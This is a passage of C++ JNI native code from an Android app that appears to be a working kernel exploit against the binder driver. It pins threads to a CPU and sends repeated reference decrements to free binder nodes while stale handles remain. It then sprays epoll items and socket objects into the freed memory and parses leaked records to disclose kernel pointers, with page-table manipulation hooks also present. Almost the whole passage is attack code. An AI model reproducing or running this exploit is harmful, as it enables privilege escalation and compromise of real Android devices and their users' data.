        environment->GetArrayLength(cookie_array) != kCohortSize) {
        return environment->NewStringUTF(
                "status=fail stage=stale-prepare reason=arguments");
    }

    int fd = g_cohort_handles_ready ? duplicate_binder_fd() : -1;
    int found = g_cohort_handles_ready ? kCohortSize : 0;

    int submitted = 0;
    if (fd >= 0 && found == kCohortSize &&
        g_cohort_handles[kSelectedIndex] > 0) {
        for (; submitted < kPendingTransactions; ++submitted) {
            if (!queue_oneway(fd, g_cohort_handles[kSelectedIndex])) {
                break;
            }
        }
    }
    if (fd >= 0) {
        close(fd);
    }
    bool pass = found == kCohortSize && owner_cpu == 6 &&
                submitted == kPendingTransactions;
    if (pass) {
        g_cohort_ready = true;
    }
    char state[320];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=stale-prepare nodes=%zu handles=%d"
                  " selected_index=%d selected_handle=%d pending=%d"
                  " owner_cpu=%d malformed_submitted=0 reclaim=0",
                  pass ? "pass" : "fail",
                  pass ? static_cast<std::size_t>(kCohortSize) : 0U, found,
                  kSelectedIndex, g_cohort_handles[kSelectedIndex], submitted,
                  owner_cpu);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_retireCohort(
        JNIEnv* environment, jclass, jlong selected_pointer,
        jlong selected_cookie) {
    if (g_cohort_retired || !g_cohort_ready ||
        g_cohort_handles[kSelectedIndex] <= 0 ||
        selected_pointer == 0 || selected_cookie == 0) {
        return environment->NewStringUTF(
                "status=fail stage=cohort-retire reason=state");
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(6, &set);
    bool pinned = sched_setaffinity(0, sizeof(set), &set) == 0;
    int fd = duplicate_binder_fd();
    int decrements = 0;
    int failed_index = -1;
    for (; fd >= 0 && decrements < kPendingTransactions; ++decrements) {
        CveResult result = send_single_decrement(
                fd, g_cohort_handles[kSelectedIndex],
                static_cast<binder_uintptr_t>(selected_pointer),
                static_cast<binder_uintptr_t>(selected_cookie));
        if (result.ioctl_result != 0 || !result.failed_reply ||
            result.dead_reply) {
            failed_index = decrements;
            break;
        }
    }

    auto release_indexes = [fd](const std::vector<int>& indexes) {
        constexpr std::size_t command_size =
                sizeof(std::uint32_t) + sizeof(std::uint32_t);
        std::vector<std::uint8_t> commands(
                indexes.size() * 2U * command_size);
        for (std::size_t position = 0; position < indexes.size(); ++position) {
            std::uint32_t handle = static_cast<std::uint32_t>(
                    g_cohort_handles[indexes[position]]);
            std::size_t base = position * 2U * command_size;
            write_command(commands.data() + base, BC_RELEASE, &handle,
                          sizeof(handle));
            write_command(commands.data() + base + command_size, BC_DECREFS,
                          &handle, sizeof(handle));
        }
        return commands.empty() ? 0 : write_binder_commands(
                fd, commands.data(), commands.size());
    };

    std::vector<int> neighbours;
    neighbours.reserve(kCohortSize - 1);
    for (int index = 0; index < kCohortSize; ++index) {
        if (index != kSelectedIndex) {
            neighbours.push_back(index);
        }
    }
    errno = 0;
    int selected_release = decrements == kPendingTransactions && fd >= 0
            ? release_indexes(std::vector<int>{kSelectedIndex}) : -1;
    int selected_errno = errno;
    std::string selected_descriptor;
    if (selected_release == 0) {
        selected_descriptor = query_descriptor(
                fd, g_cohort_handles[kSelectedIndex]);
    }
    bool selected_handle_gone = selected_release == 0 &&
            selected_descriptor.empty();
    errno = 0;
    int neighbour_release = selected_handle_gone
            ? release_indexes(neighbours) : -1;
    int neighbour_errno = errno;
    int release_result = neighbour_release == 0 && selected_release == 0
            && selected_handle_gone ? 0 : -1;
    if (fd >= 0) {
        close(fd);
    }
    bool pass = pinned && decrements == kPendingTransactions &&
                release_result == 0;
    if (pass) {
        g_cohort_retired = true;
    }
    char state[384];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=cohort-retire decrements=%d expected=%d"
                  " failed_index=%d neighbours_released=%d"
                  " neighbour_ioctl=%d neighbour_errno=%d"
                  " selected_released=%d selected_ioctl=%d"
                  " selected_errno=%d selected_first=1"
                  " selected_handle_gone=%d"
                  " selected_handle=%d cpu=%d"
                  " stale_buffers=%d",
                  pass ? "pass" : "fail", decrements,
                  kPendingTransactions, failed_index,
                  neighbour_release == 0 ? kCohortSize - 1 : 0,
                  neighbour_release, neighbour_errno,
                  selected_release == 0 ? 1 : 0, selected_release,
                  selected_errno, selected_handle_gone ? 1 : 0,
                  g_cohort_handles[kSelectedIndex],
                  sched_getcpu(), kPendingTransactions);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jint JNICALL
Java_com_vandam_prism_NativeBridge_pinAllThreads(JNIEnv*, jclass,
                                                     jint cpu) {
    return pin_all_threads(cpu);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_preparePtePlan(JNIEnv* environment,
                                                      jclass) {
    return environment->NewStringUTF(prepare_pte_plan().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_faultPtePlan(JNIEnv* environment,
                                                    jclass) {
    return environment->NewStringUTF(fault_pte_plan().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_checkPtePlan(JNIEnv* environment,
                                                    jclass) {
    return environment->NewStringUTF(check_pte_plan().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheOwnerHandle(
        JNIEnv* environment, jclass) {
    int fd = duplicate_binder_fd();
    int handle = fd >= 0 ? locate_owner(fd) : -1;
    if (fd >= 0) {
        close(fd);
    }
    if (handle > 0) {
        g_owner_handle = handle;
    }
    char state[128];
    std::snprintf(state, sizeof(state),
            "status=%s stage=owner-handle handle=%d",
            handle > 0 ? "pass" : "fail", handle);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheOwnerHandleForDescriptor(
        JNIEnv* environment, jclass, jstring descriptor_string) {
    if (descriptor_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=owner-handle reason=descriptor");
    }
    const char* descriptor = environment->GetStringUTFChars(
            descriptor_string, nullptr);
    if (descriptor == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=owner-handle reason=descriptor");
    }
    int fd = duplicate_binder_fd();
    int handle = fd >= 0 ? locate_descriptor(fd, descriptor, 512) : -1;
    environment->ReleaseStringUTFChars(descriptor_string, descriptor);
    if (fd >= 0) {
        close(fd);
    }
    if (handle > 0) {
        g_owner_handle = handle;
    }
    char state[128];
    std::snprintf(state, sizeof(state),
            "status=%s stage=owner-handle handle=%d exact=1",
            handle > 0 ? "pass" : "fail", handle);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_vandam_prism_NativeBridge_armEpitemLeakOwner(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr ||
        g_epitem_owner_armed.exchange(true)) {
        return JNI_FALSE;
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        g_epitem_owner_armed.store(false);
        return JNI_FALSE;
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    std::thread(run_epitem_owner, std::move(directory)).detach();
    return JNI_TRUE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
        JNIEnv* environment, jclass, jstring directory_string,
        jstring nonce_string, jstring boot_id_string,
        jlong target_start_time, jboolean terminal_cleanup) {
    if (directory_string == nullptr || nonce_string == nullptr ||
        boot_id_string == nullptr || target_start_time <= 0 ||
        g_raw_target_armed.exchange(true)) {
        return JNI_FALSE;
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        g_raw_target_armed.store(false);
        return JNI_FALSE;
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    const char* nonce_characters = environment->GetStringUTFChars(
            nonce_string, nullptr);
    const char* boot_id_characters = environment->GetStringUTFChars(
            boot_id_string, nullptr);
    if (nonce_characters == nullptr || boot_id_characters == nullptr) {
        if (nonce_characters != nullptr) {
            environment->ReleaseStringUTFChars(
                    nonce_string, nonce_characters);
        }
        if (boot_id_characters != nullptr) {
            environment->ReleaseStringUTFChars(
                    boot_id_string, boot_id_characters);
        }
        g_raw_target_armed.store(false);
        return JNI_FALSE;
    }
    std::string nonce(nonce_characters);
    std::string boot_id(boot_id_characters);
    environment->ReleaseStringUTFChars(nonce_string, nonce_characters);
    environment->ReleaseStringUTFChars(
            boot_id_string, boot_id_characters);
    bool terminal = terminal_cleanup == JNI_TRUE;
    if (terminal && (nonce.size() != 32 || !lower_hex_digits(nonce) ||
                     !canonical_boot_id(boot_id))) {
        g_raw_target_armed.store(false);
        return JNI_FALSE;
    }
    std::thread(run_raw_target_owner, std::move(directory),
                std::move(nonce), std::move(boot_id),
                static_cast<std::uint64_t>(target_start_time),
                terminal).detach();
    return JNI_TRUE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cleanupOwnerFragmentBuffers(
        JNIEnv* environment, jclass) {
    std::vector<binder_uintptr_t> buffers;
    {
        std::lock_guard<std::mutex> lock(g_owner_fragment_mutex);
        buffers.swap(g_owner_fragment_buffers);
    }
    int fd = buffers.empty() ? -1 : duplicate_binder_fd();
    int freed = 0;
    if (fd >= 0) {
        for (binder_uintptr_t buffer : buffers) {
            free_buffer(fd, buffer);
            ++freed;
        }
        close(fd);
    }
    char state[160];
    bool pass = freed == kFragmentCount / 2;
    std::snprintf(state, sizeof(state),
            "status=%s stage=owner-fragment-cleanup freed=%d expected=%d",
            pass ? "pass" : "fail", freed, kFragmentCount / 2);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_runEpitemLeakClient(
        JNIEnv* environment, jclass) {
    int fd = duplicate_binder_fd();
    if (fd < 0 || g_owner_handle <= 0) {
        if (fd >= 0) {
            close(fd);
        }
        return environment->NewStringUTF(
                "status=fail stage=epitem-client reason=target");
    }
    binder_transaction_data request {};
    request.target.handle = static_cast<std::uint32_t>(g_owner_handle);
    request.code = kNativeBatchCode;
    BinderReply reply = transact_and_read(fd, request);
    if (reply.buffer == 0 || reply.offsets == 0 ||
        reply.data_size != static_cast<binder_size_t>(kCohortSize) *
                sizeof(flat_binder_object) ||
        reply.offsets_size != static_cast<binder_size_t>(kCohortSize) *
                sizeof(binder_size_t)) {
        char state[256];
        std::snprintf(state, sizeof(state),
                "status=fail stage=epitem-client reason=batch-reply"
                " ioctl=%d errno=%d data=%" PRIu64 " offsets=%" PRIu64,
                reply.ioctl_result, reply.ioctl_errno,
                static_cast<std::uint64_t>(reply.data_size),
                static_cast<std::uint64_t>(reply.offsets_size));
        close(fd);
        return environment->NewStringUTF(state);
    }

    const auto* data = reinterpret_cast<const std::uint8_t*>(reply.buffer);
    const auto* offsets = reinterpret_cast<const binder_size_t*>(
            reply.offsets);
    std::vector<int> handles;
    std::set<int> unique_handles;
    handles.reserve(kCohortSize);
    for (int index = 0; index < kCohortSize; ++index) {
        if (offsets[index] + sizeof(flat_binder_object) > reply.data_size) {
            break;
        }
        flat_binder_object object {};
        std::memcpy(&object, data + offsets[index], sizeof(object));
        int handle = static_cast<int>(object.handle);
        if (object.hdr.type != BINDER_TYPE_HANDLE || handle <= 0 ||
            !unique_handles.insert(handle).second) {
            break;
        }
        handles.push_back(handle);
    }

    int queued = 0;
    if (handles.size() == kCohortSize) {
        for (int handle : handles) {
            if (!send_code(fd, handle, kVictimHoldCode, true)) {
                break;
            }
            ++queued;
        }
    }
    bool end = queued == kCohortSize &&
            send_code(fd, g_owner_handle, kBatchEndCode, true);
    bool reply_buffer_freed = false;
    if (end) {
        std::uint8_t free_command[
                sizeof(std::uint32_t) + sizeof(reply.buffer)] {};
        write_command(free_command, BC_FREE_BUFFER,
                      &reply.buffer, sizeof(reply.buffer));
        binder_write_read free_request {};
        free_request.write_size = sizeof(free_command);
        free_request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                free_command);
        reply_buffer_freed = ioctl(fd, BINDER_WRITE_READ,
                                   &free_request) == 0 &&
                free_request.write_consumed == sizeof(free_command);
    }
    close(fd);

    char state[256];
    bool pass = handles.size() == kCohortSize &&
            queued == kCohortSize && end && reply_buffer_freed;
    std::snprintf(state, sizeof(state),
            "status=%s stage=epitem-client nodes=%zu unique=%zu"
            " transactions=%d end=%d reply_buffer_freed=%d",
            pass ? "pass" : "fail", handles.size(), unique_handles.size(),
            queued, end ? 1 : 0, reply_buffer_freed ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_reclaimWithEpitems(
        JNIEnv* environment, jclass, jstring directory_string) {
    std::lock_guard<std::mutex> producer_lock(
            g_terminal_resource_producer_mutex);
    if (g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire)) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-reclaim reason=fd-retirement");
    }
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-reclaim reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-reclaim reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    std::vector<BatchToken> tokens = read_token_inventory(
            directory + "/epitem-node-tokens.bin");
    std::set<BatchToken> unique_tokens(tokens.begin(), tokens.end());
    bool valid = tokens.size() == kCohortSize &&
            unique_tokens.size() == kCohortSize;
    for (const BatchToken& token : tokens) {
        valid = valid && token.ptr != 0 && token.cookie != 0;
    }
    std::string ready = read_text_file(
            directory + "/epitem-leak.unread-ready");
    std::size_t cpu_position = ready.find("cpu=");
    int cpu = cpu_position == std::string::npos ? -1 :
            std::atoi(ready.c_str() + cpu_position + 4);
    cpu_set_t set;
    CPU_ZERO(&set);
    if (cpu >= 0 && cpu < CPU_SETSIZE) {
        CPU_SET(cpu, &set);
    }
    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
            sched_setaffinity(0, sizeof(set), &set) == 0;

    std::vector<int> retained;
    retained.reserve(kEpitemPreDrainCount + kEpitemCount + 1);
    std::vector<int> file_probe_fds;
    std::vector<int> file_probe_epoll_fds;
    file_probe_fds.reserve(kEpitemCount);
    file_probe_epoll_fds.reserve(kEpitemCount);
    int watched = valid && pinned && g_owner_handle > 0
            ? eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK) : -1;
    if (watched >= 0) {
        retained.push_back(watched);
    }
    auto allocate_epitems = [&](int count, std::uint64_t tag) {
        int allocated = 0;
        for (int index = 0; watched >= 0 && index < count; ++index) {
            int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
            if (epoll_fd < 0) {
                break;
            }
            epoll_event event {};
            event.events = EPOLLIN;
            event.data.u64 = tag | static_cast<std::uint32_t>(index);
            if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
                close(epoll_fd);
                break;
            }
            retained.push_back(epoll_fd);
            ++allocated;
        }
        return allocated;
    };

    int predrain_epitems = allocate_epitems(
            kEpitemPreDrainCount, UINT64_C(0x5034000000000000));
    int fd = predrain_epitems == kEpitemPreDrainCount
            ? duplicate_binder_fd() : -1;
    int submitted = 0;
    for (const BatchToken& token : tokens) {
        if (fd < 0) {
            break;
        }
        CveResult result = send_single_decrement(
                fd, g_owner_handle, token.ptr, token.cookie);
        if (result.ioctl_result != 0 || !result.failed_reply ||
            result.dead_reply) {
            break;
        }
        ++submitted;
    }
    if (fd >= 0) {
        close(fd);
    }
    bool decrement_notified = submitted == kCohortSize && write_text_file(
            directory + "/epitem-nodes-decremented",
            "status=pass nodes=1152");
    std::string predrain_release;
    if (decrement_notified && wait_for_file(
            directory + "/kmalloc-predrain.released", 12000)) {
        predrain_release = read_text_file(
                directory + "/kmalloc-predrain.released");
    }
    bool predrain_released = predrain_release.rfind("status=pass", 0) == 0;

    std::vector<int> pressure_sockets;
    int pressure_errno = 0;
    int pressure_objects = predrain_released
            ? allocate_scm_pressure(
                    &pressure_sockets, &pressure_errno, watched) : 0;
    int pressure_fds_closed = release_scm_pressure(&pressure_sockets);
    bool pressure_released = pressure_objects >= kScmPressureMinimum &&
            pressure_fds_closed > 0;
    int epitems = 0;
    int file_epitems = 0;
    for (int index = 0; pressure_released && index < kEpitemCount;
         ++index) {
        int shared_epoll = epoll_create1(EPOLL_CLOEXEC);
        if (shared_epoll < 0) {
            break;
        }
        epoll_event shared_event {};
        shared_event.events = EPOLLIN;
        shared_event.data.u64 = UINT64_C(0x5334000000000000) |
                static_cast<std::uint32_t>(index);
        if (epoll_ctl(shared_epoll, EPOLL_CTL_ADD, watched,
                      &shared_event) != 0) {
            close(shared_epoll);
            break;
        }
        retained.push_back(shared_epoll);
        ++epitems;

        int probe_fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
        int probe_epoll = probe_fd >= 0
                ? epoll_create1(EPOLL_CLOEXEC) : -1;
        epoll_event probe_event {};
        probe_event.events = EPOLLIN;
        probe_event.data.u64 = UINT64_C(0x4634000000000000) |
                static_cast<std::uint32_t>(index);
        if (probe_epoll < 0 ||
            epoll_ctl(probe_epoll, EPOLL_CTL_ADD, probe_fd,
                      &probe_event) != 0) {
            if (probe_epoll >= 0) {
                close(probe_epoll);
            }
            if (probe_fd >= 0) {
                close(probe_fd);
            }
            break;
        }
        file_probe_fds.push_back(probe_fd);
        file_probe_epoll_fds.push_back(probe_epoll);
        ++file_epitems;
    }

    bool stored = false;
    if (epitems == kEpitemCount && file_epitems == kEpitemCount) {
        std::lock_guard<std::mutex> lock(g_epitem_mutex);
        if (!g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire) &&
            g_epitem_fds.empty() && g_file_probe_fds.empty() &&
            g_file_probe_epoll_fds.empty()) {
            g_epitem_fds = std::move(retained);
            g_file_probe_fds = std::move(file_probe_fds);
            g_file_probe_epoll_fds = std::move(file_probe_epoll_fds);
            stored = true;
        }
    }
    if (!stored) {
        for (int retained_fd : retained) {
            close(retained_fd);
        }
        for (int probe_fd : file_probe_fds) {
            close(probe_fd);
        }
        for (int probe_epoll : file_probe_epoll_fds) {
            close(probe_epoll);
        }
    }

    char state[448];
    bool pass = valid && pinned &&
            predrain_epitems == kEpitemPreDrainCount &&
            decrement_notified && predrain_released &&
            pressure_released &&
            submitted == kCohortSize && stored;
    std::snprintf(state, sizeof(state),
            "status=%s stage=epitem-reclaim tokens=%zu unique=%zu"
            " predrain_epitems=%d expected_predrain=%d"
            " kmalloc_predrain_released=%d"
            " pressure_objects=%d pressure_fds_closed=%d pressure_errno=%d"
            " decrements=%d expected=1152 epitems=%d expected_epitems=%d"
            " file_epitems=%d expected_file_epitems=%d"
            " cpu=%d pinned=%d retained=%d",
            pass ? "pass" : "fail", tokens.size(), unique_tokens.size(),
            predrain_epitems, kEpitemPreDrainCount,
            predrain_released ? 1 : 0, pressure_objects,
            pressure_fds_closed, pressure_errno,
            submitted, epitems, kEpitemCount, file_epitems, kEpitemCount,
            cpu, pinned ? 1 : 0, stored ? 1 : 0);
    if (pass && !write_text_file(
            directory + "/epitem-leak.read-enable", state)) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-reclaim reason=read-enable");
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_decrementNodeBatch(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=node-decrement reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=node-decrement reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    std::vector<BatchToken> tokens = read_token_inventory(
            directory + "/epitem-node-tokens.bin");
    std::set<BatchToken> unique(tokens.begin(), tokens.end());
    std::string ready = read_text_file(
            directory + "/epitem-leak.unread-ready");
    std::size_t cpu_position = ready.find("cpu=");
    int cpu = cpu_position == std::string::npos ? -1 :
            std::atoi(ready.c_str() + cpu_position + 4);
    cpu_set_t set;
    CPU_ZERO(&set);
    if (cpu >= 0 && cpu < CPU_SETSIZE) {
        CPU_SET(cpu, &set);
    }
    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    bool valid = tokens.size() == kCohortSize &&
            unique.size() == kCohortSize && pinned && g_owner_handle > 0;
    int fd = valid ? duplicate_binder_fd() : -1;
    int submitted = 0;
    for (const BatchToken& token : tokens) {
        if (fd < 0) {
            break;
        }
        CveResult result = send_single_decrement(
                fd, g_owner_handle, token.ptr, token.cookie);
        if (result.ioctl_result != 0 || !result.failed_reply ||
            result.dead_reply) {
            break;
        }
        ++submitted;
    }
    if (fd >= 0) {
        close(fd);
    }
    bool decrement_notified = submitted == kCohortSize && write_text_file(
            directory + "/epitem-nodes-decremented",
            "status=pass nodes=1152");
    std::string predrain_release;
    if (decrement_notified && wait_for_file(
            directory + "/kmalloc-predrain.released", 12000)) {
        predrain_release = read_text_file(
                directory + "/kmalloc-predrain.released");
    }
    bool predrain_released =
            predrain_release.rfind("status=pass", 0) == 0;
    std::vector<int> pressure_sockets;
    int pressure_errno = 0;
    int pressure_objects = predrain_released
            ? allocate_scm_pressure(&pressure_sockets, &pressure_errno) : 0;
    int pressure_fds_closed = release_scm_pressure(&pressure_sockets);
    bool pressure_released = pressure_objects >= kScmPressureMinimum &&
            pressure_fds_closed > 0;
    char state[384];
    bool pass = valid && submitted == kCohortSize &&
            decrement_notified && predrain_released && pressure_released;
    std::snprintf(state, sizeof(state),
            "status=%s stage=node-decrement tokens=%zu unique=%zu"
            " submitted=%d expected=1152 cpu=%d pinned=%d"
            " decrement_notified=%d predrain_released=%d"
            " pressure_objects=%d pressure_fds_closed=%d"
            " pressure_errno=%d read_enabled=0",
            pass ? "pass" : "fail", tokens.size(), unique.size(), submitted,
            cpu, pinned ? 1 : 0, decrement_notified ? 1 : 0,
            predrain_released ? 1 : 0, pressure_objects,
            pressure_fds_closed, pressure_errno);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_enableStaleRead(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=stale-read-enable reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=stale-read-enable reason=directory");
    }
    std::string path(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    path += "/epitem-leak.read-enable";
    bool pass = write_text_file(path,
            "status=pass stage=stale-read-enable");
    return environment->NewStringUTF(pass
            ? "status=pass stage=stale-read-enable"
            : "status=fail stage=stale-read-enable reason=write");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_analyseBinderRefLeak(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=binder-ref-leak reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=binder-ref-leak reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    bool multi = access((directory + "/raw-target.multi-export").c_str(),
                        F_OK) == 0 ||
            access((directory + "/binder-ref.anchor-retained").c_str(),
                   F_OK) == 0;
    std::string path = directory + "/epitem-leaks.bin";

    struct LeakRecord {
        std::uint64_t buffer;
        std::uint64_t ptr;
        std::uint64_t cookie;
    };
    int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
    std::uint32_t version = 0;
    std::uint32_t count = 0;
    bool header = fd >= 0 && read(fd, &version, sizeof(version)) ==
            sizeof(version) && read(fd, &count, sizeof(count)) ==
            sizeof(count) && version == 1 && count == kCohortSize;
    std::vector<LeakRecord> records;
    if (header) {
        records.resize(count);
        std::size_t size = records.size() * sizeof(records[0]);
        std::size_t consumed = 0;
        while (consumed < size) {
            ssize_t result = read(fd,
                    reinterpret_cast<std::uint8_t*>(records.data()) +
                            consumed,
                    size - consumed);
            if (result < 0 && errno == EINTR) {
                continue;
            }
            if (result <= 0) {
                records.clear();
                break;
            }
            consumed += static_cast<std::size_t>(result);
        }
    }
    if (fd >= 0) {
        close(fd);
    }

    struct CandidateStats {
        int total = 0;
        int death = 0;
    };
    std::map<std::uint64_t, CandidateStats> candidates;
    int zero_death_records = 0;
    int death_records = 0;
    for (const LeakRecord& record : records) {
        if (kernel_pointer(record.ptr) &&
            (record.ptr & UINT64_C(0x7f)) == 0 &&
            (record.cookie == 0 || kernel_pointer(record.cookie))) {
            CandidateStats& stats = candidates[record.ptr];
            ++stats.total;
            if (record.cookie == 0) {
                ++zero_death_records;
            } else {
                ++stats.death;
                ++death_records;
            }
        }
    }
    struct RankedNode {
        std::uint64_t address;
        int total;
        int death;
    };
    std::vector<RankedNode> ranked;
    for (const auto& candidate : candidates) {
        if (candidate.second.total >= 2) {
            ranked.push_back({candidate.first, candidate.second.total,
                              candidate.second.death});
        }
    }
    std::sort(ranked.begin(), ranked.end(),
            [](const RankedNode& left, const RankedNode& right) {
                return left.total != right.total
                        ? left.total > right.total
                        : left.address > right.address;
            });
    int required = 1;
    std::vector<RankedNode> identified;
    if (multi) {
        for (const RankedNode& candidate : ranked) {
            if (candidate.death == 0) {
                identified.push_back(candidate);
            }
        }
        if (identified.empty() ||
            (identified.size() > 1 &&
             identified[0].total <= identified[1].total)) {
            identified.clear();
        }
    } else if (!ranked.empty()) {
        identified.push_back(ranked[0]);
    }
    std::uint64_t selected = identified.empty() ? 0 : identified[0].address;
    int selected_count = identified.empty() ? 0 : identified[0].total;
    int second_count = ranked.size() < 2 ? 0 : ranked[1].total;
    bool identified_nodes = multi
            ? static_cast<int>(identified.size()) >= required
            : static_cast<int>(identified.size()) == required;
    bool pass = records.size() == kCohortSize && selected_count >= 8 &&
            identified_nodes && (multi || selected_count > second_count);
    if (pass) {
        g_disclosed_node_address.store(selected);
        std::lock_guard<std::mutex> lock(g_node_candidate_mutex);
        g_node_candidates.clear();
        for (const auto& candidate : identified) {
            g_node_candidates.push_back(candidate.address);
        }
        for (const auto& candidate : ranked) {
            if (std::find(g_node_candidates.begin(),
                          g_node_candidates.end(), candidate.address) ==
                    g_node_candidates.end()) {
                g_node_candidates.push_back(candidate.address);
            }
        }
    }
    int ranked_hits[5] {};
    int death_hits[5] {};
    for (int index = 0; index < 5 &&
         index < static_cast<int>(identified.size()); ++index) {
        ranked_hits[index] = identified[index].total;
        death_hits[index] = identified[index].death;
    }
    char state[448];
    std::snprintf(state, sizeof(state),
            "status=%s stage=binder-ref-leak records=%zu"
            " zero_death_records=%d death_records=%d candidate_nodes=%zu"
            " node_address=0x%" PRIx64 " hits=%d second_hits=%d"
            " identity_hits=%d/%d,%d/%d,%d/%d,%d/%d,%d/%d"
            " required=%d identified=%d retained_candidates=%zu"
            " aligned=%d pointer_disclosure=%d stale_buffers_freed=0",
            pass ? "pass" : "miss", records.size(), zero_death_records,
            death_records, candidates.size(), selected, selected_count,
            second_count, death_hits[0], ranked_hits[0], death_hits[1],
            ranked_hits[1], death_hits[2], ranked_hits[2], death_hits[3],
            ranked_hits[3], death_hits[4], ranked_hits[4], required,
            identified_nodes ? 1 : 0, identified.size(),
            selected != 0 && (selected & UINT64_C(0x7f)) == 0 ? 1 : 0,
            pass ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_analyseEpitemLeak(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-analysis reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=epitem-analysis reason=directory");
    }
    std::string path(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    path += "/epitem-leaks.bin";

    struct LeakRecord {
        std::uint64_t buffer;
        std::uint64_t ptr;
        std::uint64_t cookie;
    };
    int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
    std::uint32_t version = 0;
    std::uint32_t count = 0;
    bool header = fd >= 0 &&
            read(fd, &version, sizeof(version)) == sizeof(version) &&
            read(fd, &count, sizeof(count)) == sizeof(count) &&
            version == 1 && count == kCohortSize;
    std::vector<LeakRecord> records;
    if (header) {
        records.resize(count);
        std::size_t size = records.size() * sizeof(records[0]);
        std::size_t consumed = 0;
        while (consumed < size) {
            ssize_t result = read(fd,
                    reinterpret_cast<std::uint8_t*>(records.data()) +
                            consumed,
                    size - consumed);
            if (result < 0 && errno == EINTR) {
                continue;
            }
            if (result <= 0) {
                records.clear();
                break;
            }
            consumed += static_cast<std::size_t>(result);
        }
    }
    if (fd >= 0) {
        close(fd);
    }

    std::string snapshot_path = path + ".analysis";
    std::string snapshot_temporary = snapshot_path + ".tmp";
    int snapshot_fd = open(snapshot_temporary.c_str(),
            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    bool snapshot = snapshot_fd >= 0 &&
            write_all(snapshot_fd, &version, sizeof(version)) &&
            write_all(snapshot_fd, &count, sizeof(count)) &&
            write_all(snapshot_fd, records.data(),
                    records.size() * sizeof(records[0])) &&
            fsync(snapshot_fd) == 0;
    if (snapshot_fd >= 0) {
        close(snapshot_fd);
    }
